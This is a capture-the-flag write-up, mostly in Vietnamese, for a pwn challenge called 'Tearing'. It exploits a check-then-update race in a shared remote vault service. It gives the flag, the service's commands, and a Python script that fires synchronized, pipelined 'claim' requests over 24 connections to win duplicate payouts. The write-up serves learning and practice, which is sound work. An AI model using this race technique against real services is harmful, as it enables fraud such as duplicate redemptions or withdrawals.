---
title: "Tearing"
category: "Pwn"
tags: ["race-condition", "toctou"]
solve_date: "2026-10-10T12:09:00+07:00"
language: "vi"
---

# Tearing

**Flag:** `isfcr{t0ct0u_w1nd0w_0nly_0p3ns_c0ncurr3ntly}`
**Dịch vụ:** `nc 0.cloud.chals.io 26166` (remote service only, no binary released)

## Đề bài

Dịch vụ vault dùng drawer chung cho nhiều client. Mục tiêu là khai thác khoảng thời gian giữa kiểm tra và cập nhật counter để một ticket hoặc một đơn vị headroom cho nhiều payout.

## Phân tích

API theo token có status, claim, redeem và quit. Counter được giữ chung giữa connection: mở lại kết nối không reset trạng thái. Claim thành công khi prizes>need rồi trừ một prize. Giá trị tickets âm trong những lần quan sát cho thấy counter không được đồng bộ đầy đủ.

Redeem không nhận tham số số: token sau nó bị xử lý như command riêng và trả `?`. Không có cơ sở coi redeem N là thao tác N ticket.

| Input | Response observed |
|---|---|
| `status` | `prizes=16 tickets=-15 need=15` |
| `claim` | `isfcr{...}` **or** `not enough prizes` |
| `redeem` | `no tickets left` **or** `w0 dont give 30` |
| `quit` | connection closed |
| anything else | `?` |

```text
vault. commands: redeem | status | claim | quit
>
```

## Các hướng đã kiểm tra

Thử tham số của redeem không làm thay đổi semantics. Drawer không phải per-connection. Redeem không phải đường đọc prize. Các candidate command khác trong probe đều trả `?`.

## Lời giải

1. Khi prizes=16, need=15, claim tuần tự trả flag một lần rồi từ chối. Check và decrement là hai phần cần đặt các thread chạy xen kẽ.
2. Mở 24 connection, đọc banner và dùng barrier để phát claim đồng thời. Mỗi connection gửi một chuỗi ngắn claim rồi status; ghi lại flag và counter mà chính connection thấy.
3. Hai payout được quan sát trả cùng flag. Vì đây là shared instance và có client khác hoạt động, các counter không phải phép đo cô lập một cặp thread; không suy ra mọi thay đổi đều do một race của script.
4. Một phản hồi chứa raw byte bất thường. Socket output chưa đủ để xác định nguyên nhân cụ thể của phản hồi này.

```text
>>> status   prizes=16 tickets=1 need=15
>>> claim    isfcr{t0ct0u_w1nd0w_0nly_0p3ns_c0ncurr3ntly}
>>> claim    not enough prizes
>>> status   prizes=15 tickets=1 need=15
>>> claim    not enough prizes
```

```python
import socket, threading, time, sys

HOST, PORT = "0.cloud.chals.io", 26166
NCONN = int(sys.argv[1]) if len(sys.argv) > 1 else 24
CMD = "claim"

barrier = threading.Barrier(NCONN)
lock = threading.Lock()
flags, states = [], []


def worker(i):
    s = socket.create_connection((HOST, PORT), timeout=8)
    s.settimeout(2.5)
    s.recv(4096)                                  # banner
    barrier.wait()                                # release all threads together
    s.sendall(((CMD + "\n") * 8).encode())         # pipelined claims
    s.sendall(b"status\n")
    time.sleep(0.4)
    data = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            data += d
    except Exception:
        pass
    s.close()
    with lock:
        if b"isfcr{" in data:
            j, k = data.index(b"isfcr{"), data.index(b"}", j)
            flags.append(data[j:k + 1].decode())
        for ln in data.split(b"\n"):
            if ln.startswith(b"prizes="):
                states.append(ln.decode())


ts = [threading.Thread(target=worker, args=(i,)) for i in range(NCONN)]
for t in ts:
    t.start()
for t in ts:
    t.join()

print("flags:", sorted(set(flags)), "count:", len(flags))
print("states:", sorted(set(states)))
```

```text
isfcr{t0ct0u_w1nd0w_0nly_0p3ns_c0ncurr3ntly}
```

```text
hex: 1f1f1f0a3e20
txt: b'\x1f\x1f\x1f\n> '
```

## Kết quả

Flag được đọc trực tiếp từ phản hồi claim.

```text
isfcr{t0ct0u_w1nd0w_0nly_0p3ns_c0ncurr3ntly}
```

## Tái hiện

Python 3 standard library. Lưu concurrency script ở Lời giải thành `solve.py` và chạy khi instance vẫn còn prizes>need. Drawer đã bị drain không thể tự reset qua API. Các output ở dưới là dữ liệu quan sát, không phải cam kết counter cố định cho lần chạy khác.

```powershell
python solve.py 24
```

```text
flags: ['isfcr{t0ct0u_w1nd0w_0nly_0p3ns_c0ncurr3ntly}'] count: N
states: ['prizes=<value> tickets=<value> need=15', ...]
```

```bash
nc 0.cloud.chals.io 26166
status
claim
```
